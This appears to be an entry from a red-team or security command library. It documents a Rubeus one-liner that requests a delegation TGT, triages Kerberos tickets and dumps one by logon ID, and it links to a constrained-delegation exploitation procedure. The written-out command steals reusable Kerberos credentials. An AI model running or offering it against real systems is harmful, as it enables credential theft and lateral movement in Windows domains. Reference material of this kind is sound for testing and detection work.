---
id: 1370836a-bf2c-4186-927e-a8a68ce501de
name: dump-kerberos-ticket-with-rubeus
type: command
executor: powershell
data: >-
  Rubeus.exe tgtdeleg /nowrap && Rubeus.exe triage && Rubeus.exe dump
  /luid:0x12d1f7
output: null
created_at: '2023-04-06T03:56:01.852900+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - dump
verified: true
validated: true
---

# dump-kerberos-ticket-with-rubeus

## Command

```powershell
Rubeus.exe tgtdeleg /nowrap && Rubeus.exe triage && Rubeus.exe dump /luid:0x12d1f7
```

## Description

Dumps Kerberos tickets from the current session: obtains delegation TGT, triages available tickets, and exports a specific one by LUID.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /luid | Logon ID for dump (from triage) | Yes for dump |
| /nowrap | No output wrapping | No |

## Examples

### Basic Usage

Run sequence to list and dump tickets.

## Expected Output

Base64-encoded ticket from dump.

## Related

- [[procedures/kerberos-constrained-delegation-exploitation]]
- [[tools/Rubeus]]
